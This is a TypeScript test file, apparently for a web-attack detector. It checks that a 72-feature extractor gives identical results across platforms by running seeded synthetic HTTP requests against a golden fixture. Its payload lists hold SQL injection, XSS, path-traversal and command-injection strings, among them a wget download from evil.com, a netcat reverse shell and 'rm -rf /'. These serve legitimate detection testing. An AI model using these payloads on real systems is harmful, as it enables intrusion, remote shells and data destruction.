/**
 * GATE 1.6 — Determinism cross-platform test.
 *
 * Generates 1,000 CanonicalRequest samples using a seeded PRNG,
 * computes the 72-feature vector for each, and compares against
 * a golden fixture committed to the repo.
 *
 * If the golden fixture does not exist, the test writes it and
 * passes (first-run bootstrap). Subsequent runs on any platform
 * must produce identical vectors (diff = 0 across all 72,000 values).
 */
import * as fs from "fs";
import * as path from "path";
import { extractFeatureVector, FEATURE_NAMES, CanonicalRequest } from "../src/index";

const FIXTURE_PATH = path.join(__dirname, "fixtures", "determinism_golden.json");
const N_SAMPLES = 1000;
const SEED = 20260625;

// --- Seeded PRNG (mulberry32) ---
function mulberry32(seed: number): () => number {
  let s = seed | 0;
  return () => {
    s = (s + 0x6d2b79f5) | 0;
    let t = Math.imul(s ^ (s >>> 15), 1 | s);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const rng = mulberry32(SEED);

function pick<T>(arr: T[]): T {
  return arr[Math.floor(rng() * arr.length)];
}

function randInt(min: number, max: number): number {
  return min + Math.floor(rng() * (max - min + 1));
}

function randString(len: number, charset: string): string {
  let s = "";
  for (let i = 0; i < len; i++) s += charset[Math.floor(rng() * charset.length)];
  return s;
}

// --- Request generators per category ---
const ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
const ALNUM = ALPHA + "0123456789";
const PATHS = ["/api/users", "/search", "/products", "/login", "/files", "/admin", "/ping", "/health", "/v1/data", "/items"];
const UAS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "curl/7.88.1",
  "python-requests/2.31.0",
  "sqlmap/1.7",
  "",
];

const SQLI_PAYLOADS = [
  "1' OR '1'='1'--",
  "1; DROP TABLE users--",
  "' UNION SELECT username,password FROM users--",
  "admin'--",
  "1' AND 1=1 UNION SELECT null,table_name FROM information_schema.tables--",
  "1'; EXEC xp_cmdshell('whoami')--",
  "' OR 1=1#",
  "1 AND (SELECT COUNT(*) FROM users) > 0--",
  "'; INSERT INTO logs VALUES('hacked')--",
  "1' ORDER BY 1--",
];

const XSS_PAYLOADS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert('xss')>",
  "javascript:alert(document.cookie)",
  "<body onload=alert('xss')>",
  "<input onfocus=alert(1) autofocus>",
  "<marquee onstart=alert('xss')>",
  "<iframe src=javascript:alert(1)>",
  "<div style='background:url(javascript:alert(1))'>",
  "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
];

const PT_PAYLOADS = [
  "../../../../etc/passwd",
  "..\\..\\..\\windows\\win.ini",
  "%2e%2e%2f%2e%2e%2fetc/shadow",
  "....//....//etc/passwd",
  "/etc/passwd%00.jpg",
  "..%252f..%252f..%252fetc/passwd",
  "/proc/self/environ",
  "..%c0%ae..%c0%aeetc/passwd",
  "....\\....\\boot.ini",
  "/var/log/auth.log",
];

const CMDI_PAYLOADS = [
  "; cat /etc/passwd",
  "| whoami",
  "$(id)",
  "`uname -a`",
  "127.0.0.1 && ls -la /",
  "; wget http://evil.com/shell.sh",
  "| nc -e /bin/sh 10.0.0.1 4444",
  "$(curl http://evil.com)",
  "; rm -rf /",
  "127.0.0.1; ping -c 5 evil.com",
];

function makeBenign(): Partial<CanonicalRequest> {
  const p = pick(PATHS);
  const nParams = randInt(0, 5);
  const params: string[] = [];
  for (let i = 0; i < nParams; i++) {
    params.push(`${randString(randInt(2, 8), ALPHA)}=${randString(randInt(1, 20), ALNUM)}`);
  }
  return {
    method: pick(["GET", "POST", "PUT", "DELETE"]),
    path: p,
    query: params.join("&"),
    body: rng() > 0.5 ? `{"${randString(4, ALPHA)}":"${randString(randInt(5, 30), ALNUM)}"}` : "",
    userAgent: pick(UAS),
    contentType: rng() > 0.5 ? "application/json" : "",
    statusCode: pick([200, 201, 204, 301, 400, 404]),
  };
}

function makeSqli(): Partial<CanonicalRequest> {
  const payload = pick(SQLI_PAYLOADS) + randString(randInt(0, 15), ALNUM);
  const inBody = rng() > 0.5;
  return {
    method: inBody ? "POST" : "GET",
    path: pick(PATHS),
    query: inBody ? "" : `id=${payload}`,
    body: inBody ? `username=${payload}` : "",
    userAgent: pick(UAS),
    contentType: inBody ? "application/x-www-form-urlencoded" : "",
    statusCode: pick([200, 403, 500]),
  };
}

function makeXss(): Partial<CanonicalRequest> {
  const payload = pick(XSS_PAYLOADS);
  const inBody = rng() > 0.5;
  return {
    method: inBody ? "POST" : "GET",
    path: pick(PATHS),
    query: inBody ? "" : `q=${payload}`,
    body: inBody ? `comment=${payload}` : "",
    userAgent: pick(UAS),
    contentType: inBody ? "application/x-www-form-urlencoded" : "",
    statusCode: pick([200, 400]),
  };
}

function makePT(): Partial<CanonicalRequest> {
  const payload = pick(PT_PAYLOADS);
  return {
    method: "GET",
    path: `/files/${payload}`,
    query: rng() > 0.5 ? `file=${payload}` : "",
    body: "",
    userAgent: pick(UAS),
    statusCode: pick([200, 403, 404]),
  };
}

function makeCmdi(): Partial<CanonicalRequest> {
  const payload = pick(CMDI_PAYLOADS);
  const inBody = rng() > 0.5;
  return {
    method: inBody ? "POST" : "GET",
    path: pick(PATHS),
    query: inBody ? "" : `host=${payload}`,
    body: inBody ? `host=127.0.0.1${payload}` : "",
    userAgent: pick(UAS),
    contentType: inBody ? "application/x-www-form-urlencoded" : "",
    statusCode: pick([200, 500]),
  };
}

const GENERATORS = [makeBenign, makeSqli, makeXss, makePT, makeCmdi];

function generateSamples(): Partial<CanonicalRequest>[] {
  const samples: Partial<CanonicalRequest>[] = [];
  for (let i = 0; i < N_SAMPLES; i++) {
    const gen = GENERATORS[i % GENERATORS.length];
    samples.push(gen());
  }
  return samples;
}

describe("GATE 1.6 — cross-platform determinism", () => {
  const samples = generateSamples();
  const vectors = samples.map((s) => extractFeatureVector(s));

  test(`all ${N_SAMPLES} vectors have exactly ${FEATURE_NAMES.length} finite values`, () => {
    for (let i = 0; i < vectors.length; i++) {
      expect(vectors[i]).toHaveLength(FEATURE_NAMES.length);
      for (let j = 0; j < vectors[i].length; j++) {
        expect(Number.isFinite(vectors[i][j])).toBe(true);
      }
    }
  });

  test("golden fixture comparison (diff = 0)", () => {
    if (!fs.existsSync(FIXTURE_PATH)) {
      fs.mkdirSync(path.dirname(FIXTURE_PATH), { recursive: true });
      fs.writeFileSync(FIXTURE_PATH, JSON.stringify(vectors));
      console.log(`Golden fixture written: ${FIXTURE_PATH} (${N_SAMPLES} × ${FEATURE_NAMES.length})`);
      return;
    }

    const golden: number[][] = JSON.parse(fs.readFileSync(FIXTURE_PATH, "utf-8"));
    expect(golden).toHaveLength(N_SAMPLES);

    let diffs = 0;
    const mismatches: string[] = [];
    for (let i = 0; i < N_SAMPLES; i++) {
      for (let j = 0; j < FEATURE_NAMES.length; j++) {
        if (vectors[i][j] !== golden[i][j]) {
          diffs++;
          if (mismatches.length < 10) {
            mismatches.push(
              `sample[${i}].${FEATURE_NAMES[j]}: got ${vectors[i][j]}, expected ${golden[i][j]}`
            );
          }
        }
      }
    }

    if (diffs > 0) {
      fail(`Determinism FAILED: ${diffs} differences in ${N_SAMPLES * FEATURE_NAMES.length} values.\n` +
           `First mismatches:\n${mismatches.join("\n")}`);
    }
  });
});
